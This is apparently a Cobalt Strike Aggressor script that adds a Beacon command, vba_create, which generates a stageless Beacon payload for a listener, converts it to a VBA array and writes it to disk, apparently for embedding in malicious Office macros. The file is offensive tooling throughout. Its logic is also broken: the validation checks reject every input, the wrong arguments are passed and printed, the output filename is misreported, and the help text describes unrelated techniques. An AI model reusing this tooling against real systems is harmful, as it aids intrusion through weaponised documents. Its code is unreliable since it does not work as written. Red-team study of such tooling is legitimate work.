# Author: Chris Sikes
# Date: Apr 2021
# Create a stageless VBA array for the listener, thread, and architecture


alias vba_create {
	local('$bid $handle $data $exitfunc $listener $payload $arch');

	# check our arguments
	if (size(@_) != 5) {
		berror($1, "vba_create: not enough arguments. Enter Listener");
		return;
	}

	# parse our arguments
	$exitfunc	= $2;
	$arch		= $3;
	$listener = $4;

	# Verify arch is x86 or x64
	if (!($arch ismatch "x64") || !($arch ismatch "x86"))
	{
		berror($1, "vba_create: enter a valid architecture, either x64 or x86");
		return;
	}

	# Verify exitfunc is thread or process
	if (!($exitfunc ismatch "thread") || !($exitfunc ismatch "stageless"))
	{
		berror($1, "vba_create: enter a valid exitfunc, either thread or process");
		return;
	}

	if (listener_info($2) is $null)
	{
		berror($1, "Listener $3 is not found");
	}
	else
	{
    	# Generate a new payload 
    	$payload = payload($listener, $arch, $exitfunc);
		$payload = transform($payload, "vba");
		$handle = openf(">payload.vba");
		writeb($handle, $payload);
		closef($handle);

		# announce to our user..
		btask($1, "output to out.bin");

	}
}

beacon_command_register("vba_create", "Create a stageless VBA array for the listener, thread, and architecture.", "Synopsis: vba_create [exitfunc] [x86/x64] [listener] \n\nTo create a stageless VBA array for the listener\nThe SetThreadContext method using custom shellcode from disk.\nEx: From dll to .bin with SRDI.");
